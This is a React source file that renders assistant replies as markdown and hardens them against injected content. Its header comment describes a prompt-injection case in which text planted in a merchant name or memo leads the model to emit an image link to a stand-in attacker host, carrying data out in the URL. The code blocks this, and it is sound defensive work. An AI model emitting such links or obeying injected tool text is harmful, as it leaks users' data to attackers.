import ReactMarkdown, { type Components } from 'react-markdown';
import remarkGfm from 'remark-gfm';

/**
 * Markdown element map for assistant replies, tuned to the Forensic Noir theme.
 *
 * Security boundaries (do NOT weaken):
 * - react-markdown escapes raw HTML by default and strips javascript: URLs; do
 *   NOT add rehype-raw. That is the XSS boundary for model output.
 * - `img` is overridden to render NO element at all (DECISIONS Q12, spec C10).
 *   A model answer steered by injected text (a merchant name, a memo) could
 *   emit `![](https://attacker/leak?d=...)`, and an <img> makes the browser
 *   fetch that URL the moment the answer renders. Only the alt text survives,
 *   as plain text.
 * - Links in ON-DEVICE answers render as plain text (Round 2). A 0.6B model composes
 *   them from tool results that can carry attacker-controlled text, so nothing in
 *   a local answer is clickable; `LocalChatMarkdown` swaps `a` for a span and drops
 *   the destination. Server answers keep working links.
 */
export const markdownComponents: Components = {
  h1: ({ node: _node, ...props }) => (
    <h1 {...props} className="text-base font-bold mt-3 mb-1.5 first:mt-0" />
  ),
  h2: ({ node: _node, ...props }) => (
    <h2 {...props} className="text-[0.95rem] font-semibold mt-3 mb-1.5 first:mt-0" />
  ),
  h3: ({ node: _node, ...props }) => (
    <h3 {...props} className="text-sm font-semibold mt-2.5 mb-1 first:mt-0" />
  ),
  p: ({ node: _node, ...props }) => (
    <p {...props} className="my-2 first:mt-0 last:mb-0 leading-relaxed" />
  ),
  ul: ({ node: _node, ...props }) => (
    <ul {...props} className="list-disc pl-5 my-2 space-y-1 first:mt-0 last:mb-0" />
  ),
  ol: ({ node: _node, ...props }) => (
    <ol {...props} className="list-decimal pl-5 my-2 space-y-1 first:mt-0 last:mb-0" />
  ),
  li: ({ node: _node, ...props }) => (
    <li {...props} className="marker:text-green [&:has(>input)]:list-none" />
  ),
  strong: ({ node: _node, ...props }) => <strong {...props} className="font-semibold" />,
  em: ({ node: _node, ...props }) => <em {...props} className="italic" />,
  del: ({ node: _node, ...props }) => <del {...props} className="text-text-muted line-through" />,
  blockquote: ({ node: _node, ...props }) => (
    <blockquote
      {...props}
      className="border-l-2 border-green/50 pl-3 my-2 text-text-secondary italic first:mt-0 last:mb-0"
    />
  ),
  hr: ({ node: _node, ...props }) => <hr {...props} className="border-border my-3" />,
  a: ({ node: _node, href, children }) => (
    <a
      href={href}
      target="_blank"
      rel="noopener noreferrer"
      className="text-green underline underline-offset-2 hover:text-green/80"
    >
      {children}
    </a>
  ),
  // Q12: never emit an <img>; keep the alt text so the reader still sees what was there.
  img: ({ node: _node, alt }) => <span className="text-text-muted">{alt ?? ''}</span>,
  pre: ({ node: _node, children }) => (
    <pre className="bg-bg border border-border-muted rounded-lg p-3 my-2 overflow-x-auto font-mono text-xs leading-relaxed first:mt-0 last:mb-0">
      {children}
    </pre>
  ),
  code: ({ className, children }) => {
    // Fenced blocks come through as <pre><code class="language-*">; inline code does not.
    const isBlock = /language-/.test(className ?? '') || String(children).includes('\n');
    if (isBlock) return <code className={className}>{children}</code>;
    return (
      <code className="font-mono text-[0.85em] bg-surface-raised border border-border-muted rounded px-1 py-0.5">
        {children}
      </code>
    );
  },
  table: ({ node: _node, children }) => (
    <div className="overflow-x-auto my-2 first:mt-0 last:mb-0">
      <table className="w-full text-xs border-collapse">{children}</table>
    </div>
  ),
  thead: ({ node: _node, ...props }) => <thead {...props} className="bg-surface-raised" />,
  th: ({ node: _node, ...props }) => (
    <th {...props} className="border border-border px-2 py-1.5 text-left font-semibold text-text" />
  ),
  td: ({ node: _node, ...props }) => (
    <td {...props} className="border border-border px-2 py-1 text-text" />
  ),
  // GFM task-list checkbox (rendered disabled by remark-gfm)
  input: ({ node: _node, ...props }) => (
    <input {...props} readOnly className="mr-1.5 align-middle accent-green" />
  ),
};

/** The same map with links rendered as inert text: label only, the destination is dropped. */
export const localMarkdownComponents: Components = {
  ...markdownComponents,
  a: ({ node: _node, children }) => <span>{children}</span>,
};

/** Renderer for answers composed on-device (provenance local-*): no clickable links. */
export function LocalChatMarkdown({ children }: { children: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={localMarkdownComponents}>
      {children}
    </ReactMarkdown>
  );
}

/** Assistant-reply renderer used by ChatTab for server answers. */
export function ChatMarkdown({ children }: { children: string }) {
  return (
    <ReactMarkdown remarkPlugins={[remarkGfm]} components={markdownComponents}>
      {children}
    </ReactMarkdown>
  );
}
